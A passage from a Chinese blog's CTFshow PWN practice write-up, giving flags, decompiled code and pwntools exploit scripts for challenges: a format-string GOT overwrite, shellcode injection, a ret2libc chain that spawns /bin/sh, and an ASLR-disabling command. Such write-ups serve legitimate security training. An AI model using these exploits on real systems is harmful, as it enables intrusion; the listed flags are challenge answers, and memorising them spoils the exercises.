+<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io = process('./pwn')</span></span><br><span class="line">io = remote(<span class="string">'pwn.challenge.ctf.show'</span>,<span class="number">28242</span>) </span><br><span class="line">io.sendline(<span class="string">'7'</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></tbody></table></figure>
+
+<hr>
+<h2 id="33-pwn94"><a href="#33-pwn94" class="headerlink" title="33 pwn94"></a>33 pwn94</h2><p>🚩flag：<code>ctfshow{cc14b02c-70f9-461e-aa67-96516a0834a0}</code></p>
+<p>💡hint：<code>格式化字符串</code></p>
+<p>好了，你已经学会1+1=2了，接下来继续加油吧</p>
+<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">{</span><br><span class="line">  init();</span><br><span class="line">  logo();</span><br><span class="line">  ctfshow();</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+<p>跟进ctfshow()：</p>
+<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="type">void</span> __noreturn <span class="title function_">ctfshow</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">100</span>]; <span class="comment">// [esp+8h] [ebp-70h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// [esp+6Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v1 = __readgsdword(<span class="number">0x14u</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  {</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">0x64u</span>);</span><br><span class="line">    <span class="built_in">printf</span>(buf);</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+<p>进入一个循环，然后其中有明显的格式化字符串漏洞， 看到程序中有system函数，还是可以用格式化字符串漏洞任意写的，将printf_got 指针指向的地址改为 system_plt，再printf(),就相当于 system()了，如果我们再发送 “/bin/sh\x00”,作为其参数,就能getshell了。</p>
+<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="comment">#io = process('./fmt')</span></span><br><span class="line">io = remote(<span class="string">'127.0.0.1'</span>,<span class="number">10000</span>)</span><br><span class="line">elf = ELF(<span class="string">'./pwn'</span>) </span><br><span class="line">offset = <span class="number">6</span></span><br><span class="line">printf_got = elf.got[<span class="string">'printf'</span>] </span><br><span class="line">system_plt = elf.plt[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line">payload = fmtstr_payload(offset,{printf_got:system_plt}) </span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></tbody></table></figure>
+
+<hr>
+<blockquote>
+<p>34~37为堆管理器</p>
+</blockquote>
+<h2 id="34-pwn135"><a href="#34-pwn135" class="headerlink" title="34 pwn135"></a>34 pwn135</h2><p>🚩flag：<code>ctfshow{6f51b075-d479-4231-aada-f294823c75fc}</code></p>
+<p>💡hint：<code>堆管理器</code></p>
+<p><strong><code>malloc</code>、<code>calloc</code>、<code>realloc</code> 的作用</strong></p>
+<table>
+<thead>
+<tr>
+<th>函数</th>
+<th>作用</th>
+<th>关键区别</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong><code>malloc(size)</code></strong></td>
+<td>分配 <code>size</code> 字节的<strong>未初始化内存</strong>，内容随机（可能含敏感数据）。</td>
+<td>最快，但需手动初始化。</td>
+</tr>
+<tr>
+<td><strong><code>calloc(n, size)</code></strong></td>
+<td>分配 <code>n * size</code> 字节的<strong>初始化为零的内存</strong>（适合数组/结构体）。</td>
+<td>比 <code>malloc</code> 慢，但安全。</td>
+</tr>
+<tr>
+<td><strong><code>realloc(ptr, new_size)</code></strong></td>
+<td><strong>调整已分配内存块的大小</strong>（可扩大/缩小），原数据保留（新部分未初始化）。</td>
+<td>若 <code>ptr</code> 为 <code>NULL</code>，等价于 <code>malloc</code>。</td>
+</tr>
+</tbody></table>
+<p><strong>一句话总结</strong>：<br><code>malloc</code> 分配未初始化内存，<code>calloc</code> 分配并清零内存，<code>realloc</code> 调整已有内存块大小。</p>
+<p>本题输入4拿到flag。</p>
+<hr>
+<h2 id="35-pwn136"><a href="#35-pwn136" class="headerlink" title="35 pwn136"></a>35 pwn136</h2><p>🚩flag：<code>ctfshow{bc477bcf-c4ce-4e20-870e-72aa123b7703}</code></p>
+<p>💡hint：<code>堆管理器</code></p>
+<p>如何释放堆？</p>
+<blockquote>
+<h3 id="free堆块的原理"><a href="#free堆块的原理" class="headerlink" title="free堆块的原理"></a><strong>free堆块的原理</strong></h3><p>当调用 <code>free(ptr)</code> 时，堆管理器会执行以下操作：</p>
+<ol>
+<li><strong>检查指针有效性</strong>：确保 <code>ptr</code> 是由 <code>malloc</code>/<code>calloc</code>/<code>realloc</code> 分配的合法地址，防止双重释放（Double Free）或非法释放。</li>
+<li><strong>标记为未使用</strong>：将该内存块标记为 <code>free</code> 状态（通常通过修改块头部的元数据，如 <code>size</code> 和 <code>in_use</code> 标志位）。</li>
+<li><strong>合并空闲块</strong>：若相邻内存块也是空闲的，合并它们以减少碎片（<code>coalescing</code>）。</li>
+<li><strong>加入空闲链表</strong>：将释放的块插入 <code>free list</code>（如 <code>glibc</code> 的 <code>bin</code>），供后续 <code>malloc</code> 重用，可能触发 <code>brk</code>/<code>mmap</code>调整堆空间。</li>
+</ol>
+<p><strong>关键点</strong>：<code>free</code> 不会立即归还内存给操作系统，而是由堆管理器缓存复用，存在 <strong>Use-After-Free (UAF)</strong> 漏洞风险。</p>
+</blockquote>
+<p>输入4获得flag。</p>
+<hr>
+<h2 id="36-pwn137"><a href="#36-pwn137" class="headerlink" title="36 pwn137"></a>36 pwn137</h2><p>🚩flag：<code>ctfshow{31e71893-ad61-424b-85d7-c3e01878746d}</code></p>
+<p>💡hint：<code>堆管理器</code></p>
+<p>sbrk and brk example</p>
+<blockquote>
+<p><code>sbrk()</code> 和 <code>brk()</code> 是用于管理堆内存的系统调用，**<code>brk()</code> 直接设置堆的结束地址（<code>break</code>指针）到指定位置<strong>，从而扩展或收缩堆空间；</strong><code>sbrk()</code> 则是相对调整，通过增量（正数扩展、负数收缩）移动 <code>break</code> 指针**，并返回调整前的地址。两者共同维护堆的动态内存分配，<code>malloc</code> 等库函数底层依赖它们操作内存，但过度碎片化可能导致性能问题。</p>
+</blockquote>
+<hr>
+<h2 id="37-pwn138"><a href="#37-pwn138" class="headerlink" title="37 pwn138"></a>37 pwn138</h2><p>🚩flag：<code>ctfshow{3c16a2a8-a843-4cae-9eab-511d82ed8f09}</code></p>
+<p>💡hint：<code>堆管理器</code></p>
+<p>Private anonymous mapping example</p>
+<p>当用户申请内存过大时，ptmalloc2会选择通过<strong>mmap</strong>()函数创建匿名映射段供用户使用，并通过<strong>unmmap</strong>()函数进行回收。</p>
+<blockquote>
+<p>当用户申请的内存超过 <code>mmap_threshold</code>（默认 128KB，可通过 <code>mallopt</code> 调整）时，<code>ptmalloc2</code> 会绕过堆区管理，直接调用 <strong><code>mmap()</code></strong> 创建独立的匿名内存映射段（无文件关联，权限为可读写），该段与堆区隔离，减少碎片化影响；释放时调用 <strong><code>munmap()</code></strong> 立即将内存归还操作系统，避免堆缓存带来的延迟或内存泄漏风险。这种机制适合大块内存分配，但频繁使用可能引发缺页中断开销，且地址随机化（ASLR）会降低局部性效率。</p>
+</blockquote>
+<hr>
+<h2 id="38-pwn24"><a href="#38-pwn24" class="headerlink" title="38 pwn24"></a>38 pwn24</h2><p>🚩flag：<code>ctfshow{f615f3c6-b99a-4590-ac95-1f7baf5b974b}</code></p>
+<p>💡hint：<code>Linux安全机制</code></p>
+<p>你可以使用pwntools的shellcraft模块来进行攻击</p>
+<blockquote>
+<p><strong>pwntools的shellcraft模块</strong>是一个用于快速生成各种架构（如x86、ARM、MIPS等）的shellcode的工具库，它提供了预定义的汇编代码片段（如执行<code>/bin/sh</code>、系统调用、文件读写等），用户可通过简单调用（如<code>shellcraft.sh()</code>）自动适配目标平台，无需手动编写底层汇编。其核心作用是<strong>简化漏洞利用开发</strong>，尤其在栈溢出、ROP攻击等场景中，能一键生成可靠的逆向Shell、反弹Shell或权限提升代码，支持动态调整参数（如寄存器、系统调用号），并自动处理字节对齐和NULL字节过滤，大幅提升PWN题或真实漏洞利用的效率与可移植性。</p>
+</blockquote>
+<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="comment">#io = process('./pwn')</span></span><br><span class="line">io = remote(<span class="string">"pwn.challenge.ctf.show"</span>, <span class="number">28112</span>) </span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">io.sendline(shellcode)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></tbody></table></figure>
+
+<p>32位仅部分开启RELRO保护</p>
+<p>可以看到存在一个RWX权限的段，即可读可写可执行的段</p>
+<p>直接IDA查看main函数发现有一个ctfshow函数，但是无法跟进 那么就直接看汇编了：</p>
+<ol>
+<li>函数开始时进行一些栈操作，保存寄存器的值。</li>
+<li>调用 __x86_get_pc_thunk_bx 函数，获取当前的指令位置并存储在 ebx 寄存器中。</li>
+<li>分配 0x84 字节的空间用于缓冲区，存储用户输入的数据。</li>
+<li>调用 read 函数，从标准输入读取数据，并存储到缓冲区。</li>
+<li>调用 puts 函数，将缓冲区的内容打印到标准输出。</li>
+<li>通过调用 call eax 指令，以  eax 寄存器的值作为函数指针，跳转到缓冲区中存储的地址执 行。</li>
+<li>之后是一些清理工作和函数返回的准备操作。</li>
+</ol>
+<p>这题题目提示了可以使用 pwntools的shellcraft模块进行攻击</p>
+<p>shellcraft 模块是 pwntools 库中的一个子模块，用于生成各种不同体系结构的 Shellcode。 Shellcode 是一段以二进制形式编写的代码，用于利用软件漏洞、执行特定操作或获取系统权限。</p>
+<p>shellcraft 模块提供了一系列函数和方法，用于生成特定体系结构下的 Shellcode。</p>
+<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *                                 <span class="comment"># 导入  pwntools 库</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span>                      <span class="comment"># 设置日志级别为调试模式</span></span><br><span class="line"><span class="comment">#io = process('./pwn')                           # 本地连接 io = remote("pwn.challenge.ctf.show", 28112)     # 远程连接</span></span><br><span class="line">shellcode = asm(shellcraft.sh())                 <span class="comment"># 生成一个  Shellcode</span></span><br><span class="line">io.sendline(shellcode)                           <span class="comment"># 将生成的  Shellcode 发送到目标主机</span></span><br><span class="line">io.interactive()                                 <span class="comment"># 与目标主机进行交互</span></span><br></pre></td></tr></tbody></table></figure>
+
+
+
+<hr>
+<h2 id="39-pwn25"><a href="#39-pwn25" class="headerlink" title="39 pwn25"></a>39 pwn25</h2><p>🚩flag：<code>ctfshow{3a6ba94e-fcd7-4427-be46-28c0402728a7}</code></p>
+<p>💡hint：<code>Linux安全机制</code></p>
+<p>开启NX保护，或许可以试试ret2libc</p>
+<blockquote>
+<h3 id="NX保护（No-eXecute）"><a href="#NX保护（No-eXecute）" class="headerlink" title="NX保护（No-eXecute）"></a><strong>NX保护（No-eXecute）</strong></h3><p>NX保护是一种内存保护机制，由CPU和操作系统共同实现，<strong>通过将数据段（如栈、堆）标记为不可执行</strong>（<code>READ/WRITE</code>但无<code>EXECUTE</code>权限），阻止攻击者在这些区域直接执行恶意代码（如shellcode）。其核心目的是防御栈溢出等漏洞利用技术，迫使攻击者转向更复杂的利用方式（如ROP）。现代编译器默认开启NX（通过<code>-z noexecstack</code>选项），可用<code>checksec</code>工具检测程序是否启用该保护。</p>
+<hr>
+<h3 id="ret2libc（Return-to-libc）"><a href="#ret2libc（Return-to-libc）" class="headerlink" title="ret2libc（Return-to-libc）"></a><strong>ret2libc（Return-to-libc）</strong></h3><p>ret2libc是一种绕过NX保护的漏洞利用技术，<strong>通过覆盖返回地址跳转到libc库中的函数</strong>（如<code>system</code>、<code>execve</code>），而非直接执行shellcode。攻击步骤通常为：1) 泄露libc基地址（利用<code>puts</code>或<code>printf</code>）；2) 计算目标函数（如<code>system("/bin/sh")</code>）的真实地址；3) 构造ROP链调用该函数。这种技术依赖程序动态链接libc的特性，无需注入代码，但需处理地址随机化（ASLR）和参数传递问题。</p>
+</blockquote>
+<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置日志级别和架构</span></span><br><span class="line">context(log_level=<span class="string">'debug'</span>, arch=<span class="string">'i386'</span>, os=<span class="string">'linux'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 远程连接</span></span><br><span class="line">io = remote(<span class="string">"pwn.challenge.ctf.show"</span>, <span class="number">28233</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加载ELF文件</span></span><br><span class="line">elf = ELF(<span class="string">'./pwn'</span>)</span><br><span class="line">main_addr = elf.sym[<span class="string">'main'</span>]</span><br><span class="line">write_got = elf.got[<span class="string">'write'</span>]</span><br><span class="line">write_plt = elf.plt[<span class="string">'write'</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 第一次payload：泄露write函数的真实地址</span></span><br><span class="line">payload1 = cyclic(<span class="number">0x88</span> + <span class="number">4</span>) + p32(write_plt) + p32(main_addr) + p32(<span class="number">1</span>) + p32(write_got) + p32(<span class="number">4</span>)</span><br><span class="line">io.sendline(payload1)</span><br><span class="line">write_addr = u32(io.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">"write address:"</span>, <span class="built_in">hex</span>(write_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用LibcSearcher查找匹配的libc版本</span></span><br><span class="line">libc = LibcSearcher(<span class="string">'write'</span>, write_addr)</span><br><span class="line">libc_base = write_addr - libc.dump(<span class="string">'write'</span>)</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">'system'</span>)</span><br><span class="line">bin_sh_addr = libc_base + libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 第二次payload：调用system("/bin/sh")</span></span><br><span class="line">payload2 = cyclic(<span class="number">0x88</span> + <span class="number">4</span>) + p32(system_addr) + p32(main_addr) + p32(bin_sh_addr)</span><br><span class="line">io.sendline(payload2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取交互式shell</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></tbody></table></figure>
+
+<hr>
+<h2 id="40-pwn-26"><a href="#40-pwn-26" class="headerlink" title="40 pwn 26"></a>40 pwn 26</h2><p>🚩flag：<code>ctfshow{3a6ba94e-fcd7-4427-be46-28c0402728a7}</code></p>
+<p>💡hint：<code>Linux安全机制</code></p>
+<p>设置好 ASLR 保护参数值即可获得flag</p>
+<p>为确保flag正确，本题建议用提供虚拟机运行</p>
+<p><a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1aBhaQfgcw4m2ut6ybNOBmA">libc下载地址</a></p>
+<p>提取码为： <strong>show</strong></p>
+<blockquote>
+<p><strong>ASLR（Address Space Layout Randomization，地址空间布局随机化）</strong>是一种安全防护机制，由操作系统在程序运行时<strong>动态随机化内存布局</strong>（如栈、堆、libc库的基地址），使得攻击者难以预测关键数据或代码的绝对地址（如<code>system</code>函数、<code>/bin/sh</code>字符串），从而阻止基于固定地址的漏洞利用（如栈溢出、ROP链）。ASLR通过增加攻击者定位目标的难度，有效防御大多数内存攻击，但若结合信息泄露漏洞（如格式化字符串、UAF）获取随机化后的地址，仍可能被绕过。现代操作系统（如Linux、Windows）默认全局开启ASLR，可通过<code>cat /proc/sys/kernel/randomize_va_space</code>查看配置（<code>2</code>表示完全启用）。</p>
+</blockquote>
+<blockquote>
+<p>可以将该文件的值设置为以下几个选项之一来控制 ASLR 的行为：</p>
+<ul>
+<li>0：关闭 ASLR，内存布局不随机化。</li>
+<li>1：启用 ASLR，但只有堆和栈是随机化的。</li>
+<li>2：启用完整的 ASLR，所有内存段（包括堆、栈、共享库等）都是随机化的。</li>
+</ul>
+</blockquote>
+<p>使用命令设置 ASLR 的级别 ：</p>
+<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">"0"</span> &gt; /proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></tbody></table></figure>
+
+<p>flag is ：ctfshow{0x400687_0x400560_0x603260_0x7ffff7fd64f0} </p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://sereniusx.github.io">SereniusX</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://sereniusx.github.io/2026/01/30/CTFshowPWN%E7%BB%83%E4%B9%A0/">https://sereniusx.github.io/2026/01/30/CTFshowPWN%E7%BB%83%E4%B9%A0/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://sereniusx.github.io" target="_blank">SereniusX的博客</a>！</span></div></div><div class="tag_share"><div class="post-share"><div class="social-share" data-image="/img/avatar2.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2026/01/30/ai%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/" title="ai使用教程"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">ai使用教程</div></div><div class="info-2"><div class="info-item-1">一切皆可 AI：我的 AI 使用技巧与大学学习实践心得 在很长一段时间里，我一直把 AI 当成“有问题才用的工具”。后来我发现，其实换一个视角——一切皆可 AI，很多事情都会变得更轻松。  这篇文章主要记录我在学习、做项目以及日常思考中使用 AI 的一些观念转变和实践经验，尤其是对大学阶段的同学来说，AI 不只是“写作业神器”，而是一个可以长期共处的「...</div></div></div></a><a class="pagination-related" href="/2026/01/29/CTF%E9%A2%98%E8%A7%A3%E6%A8%A1%E6%9D%BF/" title="[CTF][Web] 题目名称"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">[CTF][Web] 题目名称</div></div><div class="info-2"><div class="info-item-1">一、题目信息 比赛 / 平台： 题目类型：Web 难度（主观）： 是否独立完成：是 / 否   二、环境 &amp; 入口 环境：Docker / 远程 / 本地 访问地址： 初始功能点： 登录 文件上传 查询接口 其他：     三、我的第一反应（非常重要） 看到题目的第一直觉   第一眼我觉得这是在考： 我最先尝试了： 当时的判断是否正确：  （哪...</div></div></div></a></nav><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="giscus-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/avatar2.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">SereniusX</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">12</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">9</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">7</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/sereniusx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#01-pwn0"><span class="toc-text">01 pwn0</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#02-pwn1"><span class="toc-text">02 pwn1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#03-pwn2"><span class="toc-text">03 pwn2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#04-pwn03"><span class="toc-text">04 pwn03</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#05-pwn4"><span class="toc-text">05 pwn4</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#06-pwn5"><span class="toc-text">06 pwn5</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#07-pwn6"><span class="toc-text">07 pwn6</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#08-pwn7"><span class="toc-text">08 pwn7</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#09-pwn8"><span class="toc-text">09 pwn8</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#x86-%E6%B1%87%E7%BC%96%E5%AF%BB%E5%9D%80%E6%96%B9%E5%BC%8F%E8%AF%A6%E8%A7%A3"><span class="toc-text">x86 汇编寻址方式详解</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#10-pwn9"><span class="toc-text">10 pwn9</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#11-pwn10"><span class="toc-text">11 pwn10</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#12-pwn11"><span class="toc-text">12 pwn11</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#13-pwn12"><span class="toc-text">13 pwn12</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#14-pwn13"><span class="toc-text">14 pwn13</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#15-pwn14"><span class="toc-text">15 pwn14</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#16-pwn15"><span class="toc-text">16 pwn15</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#17-pwn16"><span class="toc-text">17 pwn16</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#18-pwn17"><span class="toc-text">18 pwn17</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#19-pwn18"><span class="toc-text">19 pwn18</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#20-pwn19"><span class="toc-text">20 pwn19</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#21-pwn20"><span class="toc-text">21 pwn20</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#22-pwn21"><span class="toc-text">22 pwn21</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#23-pwn22"><span class="toc-text">23 pwn22</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#24-pwn23"><span class="toc-text">24 pwn23</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#25-pwn35"><span class="toc-text">25 pwn35</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#26-pwn36"><span class="toc-text">26 pwn36</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#27-pwn37"><span class="toc-text">27 pwn37</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#28-pwn38"><span class="toc-text">28 pwn38</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#29-pwn39"><span class="toc-text">29 pwn39</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#30-pwn91"><span class="toc-text">30 pwn91</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#31-pwn92"><span class="toc-text">31 pwn92</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#32-pwn93"><span class="toc-text">32 pwn93</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#33-pwn94"><span class="toc-text">33 pwn94</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#34-pwn135"><span class="toc-text">34 pwn135</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#35-pwn136"><span class="toc-text">35 pwn136</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#free%E5%A0%86%E5%9D%97%E7%9A%84%E5%8E%9F%E7%90%86"><span class="toc-text">free堆块的原理</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#36-pwn137"><span class="toc-text">36 pwn137</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#37-pwn138"><span class="toc-text">37 pwn138</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#38-pwn24"><span class="toc-text">38 pwn24</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#39-pwn25"><span class="toc-text">39 pwn25</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#NX%E4%BF%9D%E6%8A%A4%EF%BC%88No-eXecute%EF%BC%89"><span class="toc-text">NX保护（No-eXecute）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ret2libc%EF%BC%88Return-to-libc%EF%BC%89"><span class="toc-text">ret2libc（Return-to-libc）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#40-pwn-26"><span class="toc-text">40 pwn 26</span></a></li></ol></div></div><div class="card-widget card-post-series"><div class="item-headline"><i class="fa-solid fa-layer-group"></i><span>CTFshow刷题记录</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/01/30/CTFshowPWN%E7%BB%83%E4%B9%A0/" title="CTF-PWN暑期刷题记录">CTF-PWN暑期刷题记录</a><time datetime="2026-01-30T13:02:12.000Z" title="发表于 2026-01-30 21:02:12">2026-01-30</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;2025 - 2026 By SereniusX</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.4.0-b2</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="前往评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"><script>(() => {
+  const runMermaid = ele => {
+    window.loadMermaid = true
+    const theme = document.documentElement.getAttribute('data-theme') === 'dark' ? 'dark' : 'default'
+
+    ele.forEach((item, index) => {
+      const mermaidSrc = item.firstElementChild
+      const mermaidThemeConfig = `%%{init:{ 'theme':'${theme}'}}%%\n`
+      const mermaidID = `mermaid-${index}`
+      const mermaidDefinition = mermaidThemeConfig + mermaidSrc.textContent
+
+      const renderFn = mermaid.render(mermaidID, mermaidDefinition)
+      const renderMermaid = svg => {
+        mermaidSrc.insertAdjacentHTML('afterend', svg)
+      }
+
+      // mermaid v9 and v10 compatibility
+      typeof renderFn === 'string' ? renderMermaid(renderFn) : renderFn.then(({ svg }) => renderMermaid(svg))
+    })
+  }
+
+  const codeToMermaid = () => {
+    const codeMermaidEle = document.querySelectorAll('pre > code.mermaid')
+    if (codeMermaidEle.length === 0) return
+
+    codeMermaidEle.forEach(ele => {
+      const preEle = document.createElement('pre')
+      preEle.className = 'mermaid-src'
+      preEle.hidden = true
+      preEle.textContent = ele.textContent
+      const newEle = document.createElement('div')
+      newEle.className = 'mermaid-wrap'
+      newEle.appendChild(preEle)
+      ele.parentNode.replaceWith(newEle)
+    })
+  }
+
+  const loadMermaid = () => {
+    if (false) codeToMermaid()
+    const $mermaid = document.querySelectorAll('#article-container .mermaid-wrap')
+    if ($mermaid.length === 0) return
+
+    const runMermaidFn = () => runMermaid($mermaid)
+    btf.addGlobalFn('themeChange', runMermaidFn, 'mermaid')
+    window.loadMermaid ? runMermaidFn() : btf.getScript('https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js').then(runMermaidFn)
+  }
+
+  btf.addGlobalFn('encrypt', loadMermaid, 'mermaid')
